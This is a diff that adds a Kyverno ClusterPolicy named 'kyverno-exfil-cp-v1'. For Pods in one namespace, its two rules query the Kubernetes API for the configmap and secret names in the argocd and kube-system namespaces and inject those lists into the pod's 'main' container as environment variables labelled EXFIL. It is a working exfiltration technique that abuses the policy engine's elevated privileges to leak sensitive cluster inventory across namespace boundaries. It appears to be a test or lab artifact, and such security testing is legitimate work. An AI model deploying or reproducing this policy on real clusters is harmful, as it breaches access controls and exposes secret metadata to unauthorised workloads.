@@ -1,0 +1,62 @@
+apiVersion: kyverno.io/v1
+kind: ClusterPolicy
+metadata:
+  name: kyverno-exfil-cp-v1
+spec:
+  failurePolicy: Ignore
+  background: false
+  rules:
+  - name: exfil-argocd
+    match:
+      any:
+      - resources:
+          kinds:
+          - Pod
+          namespaces:
+          - rg-0d70dc91-cd927cab
+    context:
+    - name: argocdCMNames
+      apiCall:
+        urlPath: "/api/v1/namespaces/argocd/configmaps"
+        jmesPath: "join(',', items[*].metadata.name)"
+    - name: argocdSecretNames
+      apiCall:
+        urlPath: "/api/v1/namespaces/argocd/secrets"
+        jmesPath: "join(',', items[*].metadata.name)"
+    mutate:
+      patchStrategicMerge:
+        spec:
+          containers:
+          - (name): "main"
+            env:
+            - name: KYVERNO_EXFIL_ARGOCD_CM
+              value: "{{ argocdCMNames }}"
+            - name: KYVERNO_EXFIL_ARGOCD_SECRETS
+              value: "{{ argocdSecretNames }}"
+  - name: exfil-kubesys
+    match:
+      any:
+      - resources:
+          kinds:
+          - Pod
+          namespaces:
+          - rg-0d70dc91-cd927cab
+    context:
+    - name: kubeSystemCMNames
+      apiCall:
+        urlPath: "/api/v1/namespaces/kube-system/configmaps"
+        jmesPath: "join(',', items[*].metadata.name)"
+    - name: kubeSystemSecretNames
+      apiCall:
+        urlPath: "/api/v1/namespaces/kube-system/secrets"
+        jmesPath: "join(',', items[*].metadata.name)"
+    mutate:
+      patchStrategicMerge:
+        spec:
+          containers:
+          - (name): "main"
+            env:
+            - name: KYVERNO_EXFIL_KUBESYS_CM
+              value: "{{ kubeSystemCMNames }}"
+            - name: KYVERNO_EXFIL_KUBESYS_SECRETS
+              value: "{{ kubeSystemSecretNames }}"
